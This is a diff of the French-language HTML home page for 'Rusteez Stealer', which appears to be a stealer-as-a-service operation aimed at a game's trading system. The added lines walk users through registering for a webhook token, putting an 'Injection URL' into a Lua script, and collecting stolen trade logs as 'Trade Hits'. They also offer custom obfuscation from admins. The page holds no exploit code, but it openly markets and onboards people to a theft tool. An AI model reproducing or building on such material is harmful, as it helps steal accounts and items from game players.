@@ -2,22 +2,32 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="/style.css">
     <title>Rusteez Stealer | Home</title>
 </head>
 <body>
-    <div class="container">
-        <h1 style="font-size: 2.5em; letter-spacing: 3px;">RUSTEEZ <span style="color:var(--accent)">STEALER</span></h1>
-        <p style="color: var(--text-muted); font-style: italic; margin-bottom: 30px;">
-            "The ultimate brainrot trade machine stealer."
-        </p>
-        
-        <div class="action-buttons">
-            <button onclick="window.location.href='/login'">ACCESS PANEL</button>
-            <p style="margin-top: 20px; font-size: 0.9em;">
-                New to the network? <a href="/signup">Create an account</a>
-            </p>
+    <nav class="navbar">
+        <a href="/" class="nav-logo">RUSTEEZ</a>
+        <div class="nav-links">
+            <a href="/login">Login</a>
+            <a href="/signup" style="background:var(--accent); padding:8px 15px; border-radius:5px;">Get Started</a>
+        </div>
+    </nav>
+
+    <div class="page-container">
+        <h1>Rusteez <span style="color:var(--accent)">Stealer</span></h1>
+        <p>The ultimate brainrot trade machine stealer.</p>
+
+        <div class="info-section">
+            <h2>How to use Rusteez?</h2>
+            <hr style="border:0.5px solid #444">
+            <p><strong>1. Create an Account:</strong> Register on the network to get your unique Webhook Token.</p>
+            <p><strong>2. Configure your Script:</strong> Use your <code>Injection URL</code> found in your dashboard within your Lua script.</p>
+            <p><strong>3. Profit:</strong> All trade machine logs will be sent directly to your "Trade Hits" tab in real-time.</p>
+            
+            <div style="background:rgba(155, 89, 182, 0.1); padding:20px; border-radius:10px; border-left:4px solid var(--accent);">
+                <strong>💡 Tip:</strong> You can use our integrated messaging system to contact an Admin for help or custom obfuscation.
+            </div>
         </div>
     </div>
 </body>
